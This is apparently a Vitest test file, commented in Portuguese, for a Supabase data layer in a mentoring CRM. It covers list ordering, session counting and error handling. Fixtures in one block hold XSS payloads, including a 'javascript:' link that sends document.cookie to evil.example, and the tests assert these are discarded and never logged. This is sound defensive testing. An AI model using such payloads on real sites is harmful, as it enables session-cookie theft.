// Testes de `dados.ts` — a camada que LÊ a mentoria do Supabase.
//
// Dublê do cliente via `vi.mock` em "../supabase/server" (o mesmo client que
// o resto do repositório usa, ver `src/lib/supabase/server.ts`), no espírito
// de `src/middleware.test.ts` (que dubla `@supabase/ssr`) e
// `src/lib/data/sheets-db.test.ts` (que dubla a origem de I/O da planilha):
// o teste não fala com um Postgres de verdade, só prova que `dados.ts`
// reage certo ao que o cliente devolve.
//
// `vi.hoisted` porque `vi.mock` é içado para o topo do arquivo pelo
// transform do Vitest, antes de qualquer `const` comum — sem isto o mock
// cairia em TDZ quando a fábrica fosse executada (mesmo motivo do
// middleware.test.ts).

import { afterEach, describe, expect, it, vi } from "vitest";
import type { AtendimentoLido } from "./dados-atendimento";

const { criarSupabaseServerMock, lerAtendimentoMock } = vi.hoisted(() => ({
  criarSupabaseServerMock: vi.fn(),
  lerAtendimentoMock: vi.fn(),
}));

vi.mock("../supabase/server", () => ({
  criarSupabaseServer: criarSupabaseServerMock,
}));

vi.mock("./dados-atendimento", () => ({
  lerAtendimento: lerAtendimentoMock,
}));

const { lerCarteira, lerFicha, lerMentoradoDoAluno } = await import("./dados");

const ATENDIMENTO_VAZIO: AtendimentoLido = {
  conectado: true,
  encontrado: true,
  mapa: [],
  metas: [],
  passos: [],
  reflexoes: [],
  consentimentos: [],
};

lerAtendimentoMock.mockResolvedValue(ATENDIMENTO_VAZIO);

// ============================================================
// Dublê do cliente Supabase
// ============================================================

type RespostaTabela = {
  data: unknown;
  error: { code?: string; message?: string } | null;
};

/**
 * Builder mínimo: encadeia `.select()`/`.eq()`/`.order()` sem fazer nada com
 * os argumentos (quem decide a resposta é o teste, via `respostas`, chaveado
 * por nome de tabela) e resolve como uma Promise quando `await`ado — é
 * assim que o supabase-js se comporta de verdade (o builder É um
 * PromiseLike), e é só isso que `dados.ts` usa.
 *
 * `jogaExcecaoEm`: quando `.from(tabela)` é chamado com esse nome, lança uma
 * exceção síncrona em vez de devolver um builder — simula o cliente
 * quebrando antes mesmo de montar a query (rede fora do ar, cliente mal
 * configurado), não um `error` normal do supabase-js.
 */
function construirCliente(
  respostas: Record<string, RespostaTabela>,
  jogaExcecaoEm?: string
): { from: ReturnType<typeof vi.fn> } {
  const fromMock = vi.fn((tabela: string) => {
    if (jogaExcecaoEm === tabela) {
      throw new Error("falha de rede simulada");
    }
    const resposta: RespostaTabela = respostas[tabela] ?? { data: [], error: null };
    const builder = {
      select: () => builder,
      eq: () => builder,
      order: () => builder,
      maybeSingle: () => Promise.resolve(resposta),
      then: (resolve: (v: RespostaTabela) => void, reject: (e: unknown) => void) =>
        Promise.resolve(resposta).then(resolve, reject),
    };
    return builder;
  });
  return { from: fromMock };
}

function ligarCliente(respostas: Record<string, RespostaTabela>, jogaExcecaoEm?: string) {
  const cliente = construirCliente(respostas, jogaExcecaoEm);
  criarSupabaseServerMock.mockReturnValue(cliente);
  return cliente;
}

function ligarSupabase() {
  vi.stubEnv("NEXT_PUBLIC_SUPABASE_URL", "https://exemplo-teste.supabase.co");
  vi.stubEnv("NEXT_PUBLIC_SUPABASE_ANON_KEY", "chave-anonima-de-teste");
}

afterEach(() => {
  vi.unstubAllEnvs();
  vi.resetAllMocks();
  lerAtendimentoMock.mockResolvedValue(ATENDIMENTO_VAZIO);
});

// ============================================================
// Fixtures — linhas CRUAS (snake_case), como o Postgres devolveria.
// ============================================================

function linhaMentorado(parcial: Partial<Record<string, unknown>> = {}) {
  return {
    id: "ment-1",
    workspace_id: "ws-1",
    aluno_id: null,
    perfil_id: null,
    nome: "Ana Souza",
    telefone: "",
    email: "",
    origem: "",
    status: "ativo",
    criado_em: "2026-01-01T00:00:00Z",
    ...parcial,
  };
}

function linhaPrograma(parcial: Partial<Record<string, unknown>> = {}) {
  return {
    id: "prog-1",
    workspace_id: "ws-1",
    nome: "Elite",
    formato: "individual",
    total_sessoes: null,
    preco: 1000,
    ativo: true,
    criado_em: "2026-01-01T00:00:00Z",
    ...parcial,
  };
}

function linhaMatricula(parcial: Partial<Record<string, unknown>> = {}) {
  return {
    id: "mat-1",
    workspace_id: "ws-1",
    mentorado_id: "ment-1",
    programa_id: "prog-1",
    turma_id: null,
    inicio: "2026-01-01",
    fim_previsto: null,
    status: "ativa",
    sessoes_previstas: 12,
    criado_em: "2026-01-01T00:00:00Z",
    programa: linhaPrograma(),
    ...parcial,
  };
}

function linhaSessao(parcial: Partial<Record<string, unknown>> = {}) {
  return {
    id: `ses-${Math.random()}`,
    workspace_id: "ws-1",
    matricula_id: "mat-1",
    turma_id: null,
    numero: null,
    quando: "2026-01-10T10:00:00Z",
    duracao_min: 60,
    status: "agendada",
    link_gravacao: "",
    transcricao: "",
    resumo: "",
    criado_em: "2026-01-01T00:00:00Z",
    ...parcial,
  };
}

const AGORA = "2026-08-12T00:00:00Z";

describe("lerCarteira — sem Supabase configurado", () => {
  it("devolve conectado:false, linhas:[] e não faz NENHUMA consulta", async () => {
    const resultado = await lerCarteira(AGORA);

    expect(resultado.conectado).toBe(false);
    expect(resultado.linhas).toEqual([]);
    expect(resultado.motivo.length).toBeGreaterThan(0);
    expect(criarSupabaseServerMock).not.toHaveBeenCalled();
  });
});

describe("lerCarteira — erro na consulta", () => {
  it("conectado:false, motivo sem nome de tabela/coluna, e console.warn chamado", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: [linhaMentorado()], error: null },
      matricula: {
        data: null,
        error: { code: "42501", message: 'permission denied for table "matricula"' },
      },
      sessao: { data: [], error: null },
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const resultado = await lerCarteira(AGORA);

    expect(resultado.conectado).toBe(false);
    expect(resultado.linhas).toEqual([]);
    expect(resultado.motivo.toLowerCase()).not.toContain("matricula");
    expect(resultado.motivo.toLowerCase()).not.toContain("table");
    expect(resultado.motivo.toLowerCase()).not.toContain("select");
    expect(warnSpy).toHaveBeenCalled();

    warnSpy.mockRestore();
  });
});

describe("lerCarteira — exceção lançada pelo cliente", () => {
  it("não propaga: conectado:false e console.warn chamado", async () => {
    ligarSupabase();
    ligarCliente(
      {
        mentorado: { data: [linhaMentorado()], error: null },
        sessao: { data: [], error: null },
      },
      "matricula"
    );
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const resultado = await lerCarteira(AGORA);

    expect(resultado.conectado).toBe(false);
    expect(resultado.linhas).toEqual([]);
    expect(warnSpy).toHaveBeenCalled();

    warnSpy.mockRestore();
  });
});

describe("lerCarteira — caminho feliz", () => {
  it("duas matrículas, três sessões cada, status mistos: progresso.realizadas só conta realizadas e previstas respeita sessoes_previstas", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: {
        data: [
          linhaMentorado({ id: "ment-1", nome: "Ana Souza" }),
          linhaMentorado({ id: "ment-2", nome: "Bruno Lima" }),
        ],
        error: null,
      },
      matricula: {
        data: [
          linhaMatricula({ id: "mat-1", mentorado_id: "ment-1", sessoes_previstas: 12 }),
          linhaMatricula({ id: "mat-2", mentorado_id: "ment-2", sessoes_previstas: 6 }),
        ],
        error: null,
      },
      sessao: {
        data: [
          // mat-1: duas realizadas, uma agendada -> realizadas = 2, previstas = 12
          linhaSessao({ id: "s1", matricula_id: "mat-1", status: "realizada" }),
          linhaSessao({ id: "s2", matricula_id: "mat-1", status: "realizada" }),
          linhaSessao({ id: "s3", matricula_id: "mat-1", status: "agendada", quando: "2099-01-01T10:00:00Z" }),
          // mat-2: uma realizada, uma faltou, uma cancelada -> realizadas = 1, previstas = 6
          linhaSessao({ id: "s4", matricula_id: "mat-2", status: "realizada" }),
          linhaSessao({ id: "s5", matricula_id: "mat-2", status: "faltou" }),
          linhaSessao({ id: "s6", matricula_id: "mat-2", status: "cancelada" }),
        ],
        error: null,
      },
    });

    const resultado = await lerCarteira(AGORA);

    expect(resultado.conectado).toBe(true);
    expect(resultado.motivo).toBe("");
    expect(resultado.linhas).toHaveLength(2);

    const linhaAna = resultado.linhas.find((l) => l.mentorado.id === "ment-1")!;
    expect(linhaAna.progresso.realizadas).toBe(2);
    expect(linhaAna.progresso.previstas).toBe(12);

    const linhaBruno = resultado.linhas.find((l) => l.mentorado.id === "ment-2")!;
    expect(linhaBruno.progresso.realizadas).toBe(1);
    expect(linhaBruno.progresso.previstas).toBe(6);
  });
});

describe("lerCarteira — ordem", () => {
  it("quem tem sessão amanhã vem antes de quem tem daqui a um mês, e quem não tem nenhuma vai por último em ordem alfabética", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: {
        data: [
          linhaMentorado({ id: "ment-ana", nome: "Ana (sessão amanhã)" }),
          linhaMentorado({ id: "ment-carla", nome: "Carla (sessão em um mês)" }),
          linhaMentorado({ id: "ment-zeca", nome: "Zeca (sem sessão)" }),
          linhaMentorado({ id: "ment-bruno", nome: "Bruno (sem sessão)" }),
        ],
        error: null,
      },
      matricula: {
        data: [
          linhaMatricula({ id: "mat-ana", mentorado_id: "ment-ana" }),
          linhaMatricula({ id: "mat-carla", mentorado_id: "ment-carla" }),
          linhaMatricula({ id: "mat-zeca", mentorado_id: "ment-zeca" }),
          linhaMatricula({ id: "mat-bruno", mentorado_id: "ment-bruno" }),
        ],
        error: null,
      },
      sessao: {
        data: [
          linhaSessao({ matricula_id: "mat-ana", status: "agendada", quando: "2026-08-13T10:00:00Z" }),
          linhaSessao({ matricula_id: "mat-carla", status: "agendada", quando: "2026-09-12T10:00:00Z" }),
          // Zeca e Bruno não têm nenhuma sessão futura agendada.
        ],
        error: null,
      },
    });

    const resultado = await lerCarteira(AGORA);

    expect(resultado.linhas.map((l) => l.mentorado.id)).toEqual([
      "ment-ana",
      "ment-carla",
      "ment-bruno",
      "ment-zeca",
    ]);
  });
});

describe("lerCarteira — enum desconhecido não vaza", () => {
  it("status de matrícula 'inventado' cai no padrão da normalizadora ('ativa')", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: [linhaMentorado()], error: null },
      matricula: {
        data: [linhaMatricula({ status: "inventado" })],
        error: null,
      },
      sessao: { data: [], error: null },
    });

    const resultado = await lerCarteira(AGORA);

    expect(resultado.linhas).toHaveLength(1);
    expect(resultado.linhas[0].matricula.status).toBe("ativa");
  });

  // MÉDIO — só `statusMatriculaDe` (acima) tinha teste NESTE arquivo. Um
  // `status`/`formato` desconhecido vindo do banco, sem este teste, chegaria
  // à tela sem ninguém notar até a pílula sair sem texto (`LABEL_X[status]`
  // = undefined). Cada teste abaixo mata o mutante "trocar a chamada da
  // normalizadora pelo valor cru" na função `linhaPara*` correspondente —
  // diferente de testar `statusSessaoDe` isoladamente (já coberto em
  // tipos.test.ts), que mataria só um mutante NA PRÓPRIA normalizadora, não
  // o mutante de `dados.ts` parar de chamá-la.
  it("status de sessão 'valor-que-nao-existe' cai no padrão da normalizadora ('agendada')", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })], error: null },
      sessao: {
        data: [linhaSessao({ id: "s1", matricula_id: "mat-1", status: "valor-que-nao-existe" })],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    });

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.sessoes).toHaveLength(1);
    expect(resultado.sessoes[0].status).toBe("agendada");
  });

  it("status de mentorado 'valor-que-nao-existe' cai no padrão da normalizadora ('lead')", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: [linhaMentorado({ status: "valor-que-nao-existe" })], error: null },
      matricula: { data: [linhaMatricula()], error: null },
      sessao: { data: [], error: null },
    });

    const resultado = await lerCarteira(AGORA);

    expect(resultado.linhas).toHaveLength(1);
    expect(resultado.linhas[0].mentorado.status).toBe("lead");
  });

  it("formato de programa 'valor-que-nao-existe' cai no padrão da normalizadora ('individual')", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: [linhaMentorado()], error: null },
      matricula: {
        data: [linhaMatricula({ programa: linhaPrograma({ formato: "valor-que-nao-existe" }) })],
        error: null,
      },
      sessao: { data: [], error: null },
    });

    const resultado = await lerCarteira(AGORA);

    expect(resultado.linhas).toHaveLength(1);
    expect(resultado.linhas[0].programa?.formato).toBe("individual");
  });
});

describe("lerCarteira/lerFicha — ALTO 2: vínculo por turma (sessoesDaMatricula) não tinha NENHUM teste", () => {
  // Cenário obrigatório da revisão: turma T1 com Ana e Bruno, turma T2 com
  // Carla, uma sessão de turma REALIZADA em cada turma, e uma sessão 1:1
  // (vinculada direto à matrícula) só para Ana. Dois mutantes passavam
  // verdes sem estes testes:
  //   M9  — `sessoesDaMatricula` filtrando só por `matriculaId`, perdendo o
  //         ramo de turma inteiro.
  //   M10 — qualquer sessão de turma contando para QUALQUER matrícula de
  //         turma, ignorando qual turma é a dela (sessão de OUTRA turma
  //         vazando para o progresso/histórico de quem não participou).
  function montarClienteCenarioTurmas() {
    return {
      mentorado: {
        data: [
          linhaMentorado({ id: "ment-ana", nome: "Ana" }),
          linhaMentorado({ id: "ment-bruno", nome: "Bruno" }),
          linhaMentorado({ id: "ment-carla", nome: "Carla" }),
        ],
        error: null,
      },
      matricula: {
        data: [
          linhaMatricula({ id: "mat-ana", mentorado_id: "ment-ana", turma_id: "turma-1" }),
          linhaMatricula({ id: "mat-bruno", mentorado_id: "ment-bruno", turma_id: "turma-1" }),
          linhaMatricula({ id: "mat-carla", mentorado_id: "ment-carla", turma_id: "turma-2" }),
        ],
        error: null,
      },
      sessao: {
        data: [
          // Sessão da turma 1 — vinculada por turma_id, SEM matricula_id.
          linhaSessao({ id: "s-turma1", matricula_id: null, turma_id: "turma-1", status: "realizada" }),
          // Sessão da turma 2 — vinculada por turma_id, SEM matricula_id.
          linhaSessao({ id: "s-turma2", matricula_id: null, turma_id: "turma-2", status: "realizada" }),
          // Sessão 1:1, só da Ana — vinculada direto pela matrícula dela
          // (que também pertence à turma 1; ela pode ter os dois vínculos
          // em sessões diferentes, nunca na MESMA sessão — validarVinculo).
          linhaSessao({ id: "s-ana-1a1", matricula_id: "mat-ana", turma_id: null, status: "realizada" }),
        ],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    };
  }

  it("Ana realizadas=2 (turma + 1:1), Bruno realizadas=1 (só turma), Carla realizadas=1 (só a turma DELA)", async () => {
    ligarSupabase();
    ligarCliente(montarClienteCenarioTurmas());

    const resultado = await lerCarteira(AGORA);

    const ana = resultado.linhas.find((l) => l.mentorado.id === "ment-ana")!;
    const bruno = resultado.linhas.find((l) => l.mentorado.id === "ment-bruno")!;
    const carla = resultado.linhas.find((l) => l.mentorado.id === "ment-carla")!;

    expect(ana.progresso.realizadas).toBe(2);
    expect(bruno.progresso.realizadas).toBe(1);
    // Se M10 estivesse vivo (qualquer turma conta para qualquer matrícula de
    // turma), Carla contaria a sessão de T1 também e daria 2 aqui.
    expect(carla.progresso.realizadas).toBe(1);
  });

  it("a sessão da turma 2 NÃO aparece no histórico da ficha da Ana (ela é de T1, não de T2)", async () => {
    ligarSupabase();
    const cenario = montarClienteCenarioTurmas();
    // `lerFicha` busca `matricula` com `.eq("mentorado_id", ...)` — o dublê
    // de cliente deste arquivo não interpreta `.eq()` (ver `construirCliente`
    // acima), então aqui a resposta é montada já filtrada, do jeito que uma
    // consulta real filtrada devolveria: só a matrícula da Ana. `sessao`
    // continua com TODAS as sessões, como a consulta real de `lerFicha`
    // realmente faz (sem `.eq()` nenhum — ver o comentário em `dados.ts`).
    ligarCliente({
      ...cenario,
      matricula: { data: [linhaMatricula({ id: "mat-ana", mentorado_id: "ment-ana", turma_id: "turma-1" })], error: null },
    });

    const ficha = await lerFicha("ment-ana", AGORA);

    const idsDasSessoes = ficha.sessoes.map((s) => s.id);
    expect(idsDasSessoes).toContain("s-turma1");
    expect(idsDasSessoes).toContain("s-ana-1a1");
    expect(idsDasSessoes).not.toContain("s-turma2");
    expect(ficha.sessoes).toHaveLength(2);
  });
});

describe("lerCarteira/lerFicha — ALTO 1: link_gravacao inválido é descartado na LEITURA", () => {
  // `linkGravacaoValido` (validacao.ts) só corre na ESCRITA — uma linha
  // inserida por fora dela (Supabase Studio, script, dado anterior à regra)
  // tem que ser barrada aqui, na leitura, senão vira `<a href>` cru na
  // ficha (ver o comentário de `linkGravacaoDeLeitura` em dados.ts).
  it.each([
    ["javascript:alert(1)", "esquema javascript: puro"],
    ["data:text/html,x", "esquema data: (poderia embutir HTML/script)"],
  ])("'%s' (%s) chega à ficha como linkGravacao: ''", async (linkMalicioso) => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })], error: null },
      sessao: {
        data: [
          linhaSessao({
            id: "s1",
            matricula_id: "mat-1",
            status: "realizada",
            link_gravacao: linkMalicioso,
          }),
        ],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    });

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.sessoes).toHaveLength(1);
    expect(resultado.sessoes[0].linkGravacao).toBe("");
  });

  it("'https://ok.com/x' (esquema válido) passa intacto pela leitura", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })], error: null },
      sessao: {
        data: [
          linhaSessao({ id: "s1", matricula_id: "mat-1", status: "realizada", link_gravacao: "https://ok.com/x" }),
        ],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    });

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.sessoes[0].linkGravacao).toBe("https://ok.com/x");
  });

  it("link descartado dispara console.warn — mas o warn NUNCA imprime o link inteiro nem o id do mentorado", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })], error: null },
      sessao: {
        data: [
          linhaSessao({
            id: "s1",
            matricula_id: "mat-1",
            status: "realizada",
            link_gravacao: "javascript:fetch('https://evil.example/'+document.cookie)",
          }),
        ],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.sessoes[0].linkGravacao).toBe("");
    expect(warnSpy).toHaveBeenCalled();
    const argumentosDoWarn = warnSpy.mock.calls.flat().map((a) => String(a));
    for (const arg of argumentosDoWarn) {
      expect(arg).not.toContain("evil.example");
      expect(arg).not.toContain("document.cookie");
      expect(arg).not.toContain("ment-1");
    }

    warnSpy.mockRestore();
  });

  it("link vazio não dispara warn nenhum — não tem link é diferente de tem link ruim", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })], error: null },
      sessao: {
        data: [linhaSessao({ id: "s1", matricula_id: "mat-1", status: "realizada", link_gravacao: "" })],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.sessoes[0].linkGravacao).toBe("");
    expect(warnSpy).not.toHaveBeenCalled();

    warnSpy.mockRestore();
  });
});

describe("lerFicha", () => {
  it("sem Supabase configurado: conectado:false, mentorado:null, nenhuma consulta", async () => {
    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.conectado).toBe(false);
    expect(resultado.mentorado).toBeNull();
    expect(resultado.matriculas).toEqual([]);
    expect(criarSupabaseServerMock).not.toHaveBeenCalled();
  });

  it("id que não existe: conectado:true, mentorado:null (conectou e não achou é diferente de não conseguir conectar)", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: null, error: null },
    });

    const resultado = await lerFicha("id-que-nao-existe", AGORA);

    expect(resultado.conectado).toBe(true);
    expect(resultado.motivo).toBe("");
    expect(resultado.mentorado).toBeNull();
    expect(resultado.matriculas).toEqual([]);
    expect(resultado.sessoes).toEqual([]);
    expect(resultado.tarefas).toEqual([]);
    expect(resultado.marcos).toEqual([]);
    expect(resultado.scores).toEqual([]);
  });

  it("caminho feliz: sessões mais recentes primeiro, scores em ordem cronológica crescente", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: {
        data: [linhaMatricula({ id: "mat-1", mentorado_id: "ment-1" })],
        error: null,
      },
      sessao: {
        data: [
          linhaSessao({ id: "s-antiga", matricula_id: "mat-1", status: "realizada", quando: "2026-01-01T10:00:00Z" }),
          linhaSessao({ id: "s-recente", matricula_id: "mat-1", status: "realizada", quando: "2026-06-01T10:00:00Z" }),
        ],
        error: null,
      },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: {
        data: [
          { id: "sc-2", workspace_id: "ws-1", mentorado_id: "ment-1", semana: "2026-02-01", score: 80, motivo: "", criado_em: "2026-02-01T00:00:00Z" },
          { id: "sc-1", workspace_id: "ws-1", mentorado_id: "ment-1", semana: "2026-01-01", score: 60, motivo: "", criado_em: "2026-01-01T00:00:00Z" },
        ],
        error: null,
      },
    });

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.conectado).toBe(true);
    expect(resultado.mentorado?.id).toBe("ment-1");
    expect(resultado.sessoes.map((s) => s.id)).toEqual(["s-recente", "s-antiga"]);
    expect(resultado.scores.map((s) => s.id)).toEqual(["sc-1", "sc-2"]);
    expect(resultado.matriculas).toHaveLength(1);
    expect(resultado.matriculas[0].progresso.realizadas).toBe(2);
  });

  it("compõe o atendimento já autorizado na ficha do mesmo mentorado", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: { data: [], error: null },
      sessao: { data: [], error: null },
      tarefa_mentoria: { data: [], error: null },
      marco: { data: [], error: null },
      score_evolucao: { data: [], error: null },
      conteudo_liberado: { data: [], error: null },
    });
    lerAtendimentoMock.mockResolvedValueOnce({
      conectado: true,
      encontrado: true,
      mapa: [{ dimensao: "emocional", nota: 7 }],
      metas: [{ titulo: "Ter uma conversa importante" }],
      passos: [],
      reflexoes: [{ texto: "Quero agir com mais clareza.", visibilidade: "privada_profissional" }],
      consentimentos: [],
    } satisfies AtendimentoLido);

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.atendimento).toEqual({
      conectado: true,
      encontrado: true,
      mapa: [{ dimensao: "emocional", nota: 7 }],
      metas: [{ titulo: "Ter uma conversa importante" }],
      passos: [],
      reflexoes: [{ texto: "Quero agir com mais clareza.", visibilidade: "privada_profissional" }],
      consentimentos: [],
    });
    expect(lerAtendimentoMock).toHaveBeenCalledWith("ment-1");
  });

  it("erro na consulta: conectado:false, motivo sem detalhe técnico, console.warn chamado", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: linhaMentorado({ id: "ment-1" }), error: null },
      matricula: {
        data: null,
        error: { code: "PGRST301", message: "linha inacessível por RLS na tabela matricula" },
      },
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    const resultado = await lerFicha("ment-1", AGORA);

    expect(resultado.conectado).toBe(false);
    expect(resultado.mentorado).toBeNull();
    expect(resultado.motivo.toLowerCase()).not.toContain("matricula");
    expect(warnSpy).toHaveBeenCalled();

    warnSpy.mockRestore();
  });
});

// ============================================================
// lerMentoradoDoAluno — a ponte entre a ficha de CRM e a de mentoria
// ============================================================
//
// `alunos` (funil de vendas) e `mentorado` (pós-venda) continuam sendo duas
// tabelas, por decisão registrada no cabeçalho de `mentorado` em 0006. Esta
// leitura é o LINK entre as duas fichas — não um `JOIN` que as funde.
//
// Tudo aqui é fail-closed no mesmo sentido: quando não dá para AFIRMAR que
// existe um mentorado vinculado, a resposta é `null` e a ficha de CRM
// simplesmente não desenha o link. Um atalho que falta é um incômodo
// visível; um atalho que aponta para a ficha errada é uma pessoa lendo o
// histórico de outra.

describe("lerMentoradoDoAluno", () => {
  it("devolve o id do mentorado vinculado", async () => {
    ligarSupabase();
    ligarCliente({ mentorado: { data: linhaMentorado({ id: "ment-9", aluno_id: "aluno-1" }), error: null } });

    expect(await lerMentoradoDoAluno("aluno-1")).toBe("ment-9");
  });

  it("sem Supabase configurado, NENHUMA consulta é feita e a resposta é null", async () => {
    const cliente = ligarCliente({});

    expect(await lerMentoradoDoAluno("aluno-1")).toBeNull();
    expect(cliente.from).not.toHaveBeenCalled();
  });

  it("id vazio não vira consulta: `aluno_id = ''` não é pergunta que se faça ao banco", async () => {
    ligarSupabase();
    const cliente = ligarCliente({ mentorado: { data: linhaMentorado(), error: null } });

    expect(await lerMentoradoDoAluno("   ")).toBeNull();
    expect(cliente.from).not.toHaveBeenCalled();
  });

  it("conectou e não achou (aluno que nunca virou mentorado): null, e nada de erro", async () => {
    ligarSupabase();
    ligarCliente({ mentorado: { data: null, error: null } });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    expect(await lerMentoradoDoAluno("aluno-1")).toBeNull();
    // Não achar é uma RESPOSTA, não uma falha: lead em prospecção não tem
    // ficha de mentoria, e isso não é assunto de log.
    expect(warnSpy).not.toHaveBeenCalled();

    warnSpy.mockRestore();
  });

  it("erro na consulta (RLS, rede): null e o detalhe só no console.warn", async () => {
    ligarSupabase();
    ligarCliente({
      mentorado: { data: null, error: { code: "PGRST301", message: "linha inacessível por RLS" } },
    });
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    expect(await lerMentoradoDoAluno("aluno-1")).toBeNull();
    expect(warnSpy).toHaveBeenCalled();

    warnSpy.mockRestore();
  });

  it("exceção do cliente não sobe: a ficha de CRM inteira não pode cair por causa de um atalho", async () => {
    ligarSupabase();
    ligarCliente({}, "mentorado");
    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

    expect(await lerMentoradoDoAluno("aluno-1")).toBeNull();
    expect(warnSpy).toHaveBeenCalled();

    warnSpy.mockRestore();
  });

  it("linha sem id utilizável devolve null — nunca um href `/mentoria/undefined`", async () => {
    ligarSupabase();
    ligarCliente({ mentorado: { data: { ...linhaMentorado(), id: null }, error: null } });

    expect(await lerMentoradoDoAluno("aluno-1")).toBeNull();
  });
});
